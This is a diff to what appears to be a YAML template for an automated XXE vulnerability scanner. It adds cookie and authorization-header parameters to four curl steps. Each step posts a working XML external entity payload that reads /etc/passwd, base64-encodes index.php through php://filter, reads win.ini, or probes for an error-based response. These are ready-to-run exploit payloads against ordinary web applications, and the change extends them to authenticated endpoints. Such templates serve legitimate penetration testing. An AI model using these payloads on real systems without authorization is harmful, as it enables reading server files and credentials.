@@ -18,13 +18,13 @@ references:
 
 target_schema:
   required: [url]
-  optional: [collaborator_host]
+  optional: [collaborator_host, cookie, auth_header]
 
 steps:
   - name: classic_file_read
     tool: curl
     command: >-
-      curl -s -X POST -H "Content-Type: application/xml" --data-binary
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -X POST -H "Content-Type: application/xml" --data-binary
       '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
       "{{url}}"
     evaluators:
@@ -41,7 +41,7 @@ steps:
     tool: curl
     when: no_finding_yet
     command: >-
-      curl -s -X POST -H "Content-Type: application/xml" --data-binary
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -X POST -H "Content-Type: application/xml" --data-binary
       '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><r>&xxe;</r>'
       "{{url}}"
     evaluators:
@@ -56,7 +56,7 @@ steps:
     tool: curl
     when: no_finding_yet
     command: >-
-      curl -s -X POST -H "Content-Type: application/xml" --data-binary
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -X POST -H "Content-Type: application/xml" --data-binary
       '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><r>&xxe;</r>'
       "{{url}}"
     evaluators:
@@ -73,7 +73,7 @@ steps:
     tool: curl
     when: no_finding_yet
     command: >-
-      curl -s -X POST -H "Content-Type: application/xml" --data-binary
+      curl -s -b "{{cookie}}" -H "{{auth_header}}" -X POST -H "Content-Type: application/xml" --data-binary
       '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///nonexistent-erlik-probe">]><r>&xxe;</r>'
       "{{url}}"
     evaluators:
